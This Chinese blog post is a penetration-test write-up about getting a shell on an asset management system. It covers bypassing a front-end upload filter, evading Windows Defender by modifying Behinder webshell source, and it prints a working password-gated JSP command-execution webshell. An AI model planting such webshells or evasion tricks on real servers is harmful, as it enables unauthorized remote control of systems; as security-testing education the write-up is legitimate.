---
title: 某资产管理系统打点过程中的免杀经历
url: https://mp.weixin.qq.com/s/Sk2SCBaETjWrNaR9eV6Tvw
source: Doonsec's feed
date: 2026-09-23
fetch_date: 2026-09-24T07:01:54.049509
---

# 某资产管理系统打点过程中的免杀经历

# 某资产管理系统打点过程中的免杀经历

原创

工程新一
工程新一

蚁景网安

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

上周初，被扔过来单位内部的一个链接，让渗透一下，本以为三下五除二很快就能测完，没想到在对抗杀软时费了一番功夫，再加上杂七杂八的事儿，经过了一个星期才测完(＃￣～￣＃)。
打开链接，见到一个熟悉的登录框，是一个资产管理系统。

![image-20240305135531906](https://mmbiz.qpic.cn/sz_mmbiz_png/lFfjZayicKlHzkA3Fn4yRtvgcfOj2j8p9OXul1MTfibfCKw3q7IiaLsp6MYgiaqCx5rJuf6eE3lKV9GbDJcxxEYsUCSBUfM1f7yCP3LvFSwlfTQ/640?wx_fmt=png&from=appmsg "null")在进行了一番端口目录、认证机制、会话管理、授权访问等方面的检查后发现了一些问题，这里不做赘述，此次重点想写写拿shell的经历。
进入主页面，没用多长时间就找到了上传点，而且有两个。一个是头像上传，涉及裁剪、压缩等操作。

另一个是工具上传，允许直接上传文件（包）。两全伤害取其轻，就用这个。

创建个txt，随便加点内容进去，burp抓包看看这个功能的情况。

上传成功，并且有回显路径，有戏。

访问一下文件地址也展现出来了，直接上马子试试。

被阻断，不允许上传.java、.class、.jsp、.html等类型文件。一看就是之前经历过渗透测试，吃过亏（事后查了一下这家软件公司，做了不少企业的资产管理系统，是个成熟的项目，而且公司在2023年中已经上市，尽管在北交所，也必然会遵循一定的代码规范）。刚才上传用的是冰蝎4，查看burp的history中并无请求出现，证明是前端验证。
尝试绕过前端验证，直接将冰蝎源码上传。

成功绕过，并且返回了文件路径……这就要完活儿了？！似乎有些轻松。访问一下：

404，文件没了。紧接着又拿哥斯拉试了一遍，同样是返回了路径，同样是404……猜测可能有杀软，落地文件被删除。
接下来要做免杀了，使用在线工具对webshell进行变异，上传后一路404，更加确定杀软的存在。并且这款杀软的静态特征检测库还很全，如果仅仅混淆边边角角的代码是无法过它的，猜测它是能够匹配关键代码、关键API。

变异的厉害了还抛出了500，破坏了webshell自身的逻辑，甚至是添加了错误代码。看来省事儿的方式效果不理想，想要落地还是得自己动手，ε=(´ο｀\*)))唉。

最后使用了一个加长版的一句话木马才成功落地，请求如下：

访问文件路径并带上whoami。

直接就是administrator管理员。此马儿与传统的一句话jsp一样，也是用Runtime来执行命令，只不过前面加了一个参数pwd固定值判断，后面使用System.out来print一个String，并且这个String是命令执行的结果。

```
<% if("023".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("</pre>"); } %>
```

但是蚁剑不给力，连接时报500。尝试了多种设置均以失败告终，哪位大神研究过蚁剑还请指导一下，Thanks♪(･ω･)ﾉ。

测试到这个地步对于这个活儿来说其实可以交差了，已经拿到了权限，但如果想进行横向的话是无法继续利用的，所以还是要做免杀。
掏出珍藏多年的idea（鄙视自己一下ε(┬┬﹏┬┬)3），打开冰蝎，调好格式，尝试做混淆。
鉴于前面踩过坑，已经了解到该杀软能够检测到关键代码，所以直接分析源码。作为webshell，回显是必须的功能，而对于冰蝎来说，response数据来自于request.getReader().readLine()。因此直接对第18行动手，先用注释尝试一下，随便填加一些字符。

发送请求：

成功。访问一下回显路径：

空白页，没有报404，证明文件确实落地了，没有被杀掉。上冰蝎：

连接成功！免杀完毕。这次是真的可以交差了。
进来后第一件事儿就是看看到底是哪个杀软在作祟：

MsMpEng.exe，微软的Windows Defender。
![image.png](https://mmbiz.qpic.cn/mmbiz_png/lFfjZayicKlFEf5hcyqNXE6yA4eI0PHk4d9j2VBdqljVBngNIvLQevDAfbK7N3mj0BYpiaEjFs083wZSDFIPfv2J3lFVbx51jvdCCIkIYa9xI/640?wx_fmt=png&from=appmsg)
好奇心驱使，又拿了一个原版的冰蝎本地验证一下，果不其然，被秒杀（图中右上角的文件）：

总结，这次拿shell的过程主要是在对抗杀软上耗费了很多时间，其次是在寻找杀软的进程上。因为服务器上一般都有专业杀毒软件或者HIDS防护，没有想到是Windows自己的Defender。虽然在写的时候只用一句话一张图带过，但在搜索进程的时候还特地整理了一份常见杀软的表格，挨个儿比对才有了最后那张图。

![图片](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=10)

学习网安实战技术，戳“阅读原文”

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/TL4Y9UAcgruasR1ULCzS2icYoNn4Yz5aKdDv4u2Z8JA7ru620vsrtZjDIFMQzJFyicnn9YgOQQtbfraAJvNbwvAA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过